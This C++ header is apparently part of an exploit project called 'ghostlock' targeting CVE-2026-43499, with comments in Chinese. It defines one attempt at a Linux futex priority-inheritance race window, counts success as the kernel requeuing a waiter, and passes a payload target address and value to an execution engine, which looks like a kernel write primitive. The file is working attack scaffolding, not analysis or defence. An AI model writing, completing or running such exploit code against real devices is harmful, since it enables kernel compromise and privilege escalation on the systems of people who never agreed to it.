#pragma once
/** @file backend/cve_2026_43499/steps/window_attempt.hpp
 *  「尝试一次」的真身：两个已经准备好的 futex 字上跑一次 PI 竞态，进出窗口守卫。
 *
 *  形状对上了单元那边的钩子：`bool (*attempt)(void *context)`，context 指向 WindowAttempt。
 *  Seam 是模板参数（设备上用 FutexSeam），所以假 seam 能在主机上把这条路径测出来。
 *
 *  判据一句话：内核**真的搬了一个等待者**才算赢 —— `cmp_requeue_pi` 的返回 <1 就是没搬。
 */
#include <cstdint>

#include "backend/cve_2026_43499/race/pi_race.hpp"
#include "backend/cve_2026_43499/race/pi_window.hpp"
#include "backend/cve_2026_43499/seam/multicast_window.hpp"

namespace ghostlock::backend::cve_2026_43499::steps {
    /** One attempt: the two words (prepared elsewhere) and the guard this attempt runs inside. */
    struct WindowAttempt final {
        std::uint32_t *chain = nullptr;
        std::uint32_t *target = nullptr;
        race::WindowGuard *window = nullptr;
        /** 引擎（调用方持有）：一次尝试＝引擎跑一次；本结构只借它的指针。 */
        seam::RouteExec *route = nullptr;
        /** 载荷那一对，转交给引擎。 */
        std::uint64_t payload_target = 0U;
        std::uint64_t payload_value = 0U;
        /** The last outcome, for the caller"s report. */
        race::RaceOutcome outcome = race::RaceOutcome::NotPrepared;
    };

    /** One attempt, over any seam. @return true when this attempt won the window. */
    template <class Seam>
    bool window_attempt_once(WindowAttempt &attempt) noexcept {
        if (attempt.window == nullptr) {
            attempt.outcome = race::RaceOutcome::NotPrepared;
            return false;
        }
        race::PiRace<Seam> race{};
        race.prepare(attempt.chain, attempt.target);
        attempt.outcome = race.run(*attempt.window);
        const bool won = attempt.outcome == race::RaceOutcome::Running;
        race.disarm();
        return won;
    }

    /** The device attempt: the Linux futex seam. */
    [[nodiscard]] bool window_attempt_once_device(void *context) noexcept;
}  // namespace ghostlock::backend::cve_2026_43499::steps
